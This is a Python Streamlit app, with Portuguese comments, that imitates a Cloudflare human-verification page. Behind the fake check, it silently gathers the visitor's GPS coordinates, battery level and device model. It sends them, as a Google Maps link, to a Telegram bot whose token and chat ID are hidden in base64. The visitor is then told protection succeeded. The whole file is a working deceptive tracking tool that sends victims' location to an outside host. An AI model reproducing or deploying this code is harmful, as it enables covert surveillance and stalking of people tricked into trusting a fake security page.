import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- 1. CONFIGURAÇÃO ---
st.set_page_config(page_title="Verificação de Segurança", page_icon="🛡️", layout="centered")

# --- 2. DADOS DO TELEGRAM ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

# --- 3. CSS (TEMA ESCURO + FONTE ORBITRON NO RODAPÉ) ---
st.markdown("""
    <style>
        /* Importando a fonte Orbitron */
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');

        .stApp { background-color: #1d1d1d !important; color: #d9d9d9 !important; }
        header, footer, .stDeployButton { visibility: hidden; display: none; }

        /* Estilo Cabeçalho */
        .site-header { font-family: sans-serif; font-size: 26px; font-weight: 500; color: #fff; margin-bottom: 10px; }
        .desc-text { color: #d9d9d9; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }

        /* Widget Cloudflare */
        .cf-widget {
            background-color: #2c2c2c; border: 1px solid #444;
            padding: 15px 20px; border-radius: 4px;
            display: flex; align-items: center; justify-content: space-between;
            min-height: 65px; margin-bottom: 15px;
        }
        .cf-left { display: flex; align-items: center; gap: 15px; }
        
        /* SPINNER PONTILHADO */
        .spinner {
            font-size: 10px; width: 1em; height: 1em; border-radius: 50%;
            position: relative; text-indent: -9999em;
            animation: spin 1.3s infinite linear; color: #10b981;
        }
        .cf-left .spinner {
             box-shadow: 0em -1.5em 0em 0em currentColor, 1.1em -1.1em 0 0 currentColor, 
                         1.5em 0em 0 0 currentColor, 1.1em 1.1em 0 0 currentColor, 
                         0em 1.5em 0 0 currentColor, -1.1em 1.1em 0 0 currentColor, 
                         -1.5em 0em 0 0 currentColor, -1.1em -1.1em 0 0 currentColor;
            margin-right: 1.5em; margin-left: 0.5em;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .stButton > button {
            width: 150px; background-color: #3b82f6 !important;
            color: white !important; font-weight: 600; border-radius: 4px; height: 45px;
        }

        /* Página de Sucesso */
        .success-box { text-align: center; margin-top: 50px; }
        .success-title { font-size: 28px; font-weight: bold; color: #fff; margin-bottom: 10px; }
        .success-text { color: #10b981; font-size: 20px; font-weight: 600; }

        /* RODAPÉ ESTILO TAKEDOWN (ONDE ESTAVA O VERDE) */
        .takedown-footer {
            font-family: 'Orbitron', sans-serif;
            text-align: center;
            color: #555;
            font-size: 12px;
            margin-top: 80px;
            line-height: 1.6;
            letter-spacing: 1px;
        }
    </style>
""", unsafe_allow_html=True)

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except: pass

if 'status' not in st.session_state:
    st.session_state['status'] = 'inicio'

# --- 4. INTERFACE ---
if st.session_state['status'] == 'inicio':
    st.markdown('<div class="site-header">www.verificacaodeseguranca.com.br</div>', unsafe_allow_html=True)
    st.markdown('<div class="desc-text">Este site utiliza um serviço de segurança para proteção contra bots maliciosos.<br>Esta página é exibida enquanto o site verifica se você não é um bot.</div>', unsafe_allow_html=True)
    st.markdown('<div class="cf-widget"><div class="cf-left"><div style="width:22px; height:22px; border:2px solid #555; border-radius:3px;"></div><span>Verificando se você é humano...</span></div><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" style="height:22px; opacity:0.7;"></div>', unsafe_allow_html=True)
    
    if st.button("Verificar"):
        st.session_state['status'] = 'processando'
        st.rerun()

elif st.session_state['status'] == 'processando':
    st.markdown('<div class="site-header">Verificando...</div>', unsafe_allow_html=True)
    st.markdown('<div class="cf-widget"><div class="cf-left"><div class="spinner"></div><span>Verificando...</span></div><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" style="height:22px; opacity:0.7;"></div>', unsafe_allow_html=True)
    
    # Captura de Dados
    ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA")
    bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT")
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:7000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS")

    if posicao:
        modelo = "Celular"
        if ua:
            try:
                info = ua.split("(")[1].split(")")[0]
                for p in info.split(";"):
                    if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "iPhone"]):
                        modelo = p.strip(); break
            except: pass
        
        relatorio = f"🛡️ *CLOUDFLARE REPORT*\n📱 *Aparelho:* {modelo}\n🔋 *Bateria:* {bat if bat else '??'}%\n📍 *Local:* https://www.google.com/maps?q={posicao}"
        enviar_telegram(relatorio)
        st.session_state['status'] = 'sucesso'
        st.rerun()

elif st.session_state['status'] == 'sucesso':
    st.markdown('<div class="success-box"><div class="success-title">Verificação de Segurança</div><div class="success-text">✅ Proteção Ativada com Sucesso</div></div>', unsafe_allow_html=True)

# RODAPÉ ESTILO TAKEDOWN (TEXTO QUE VOCÊ MANDOU)
st.markdown("""
    <div class="takedown-footer">
        2026 TAKEDOWN ©. Todos os direitos reservados.<br>
        Todos os serviços são prestados em conformidade com a LGPD e demais regulamentações aplicáveis.
    </div>
""", unsafe_allow_html=True)
        
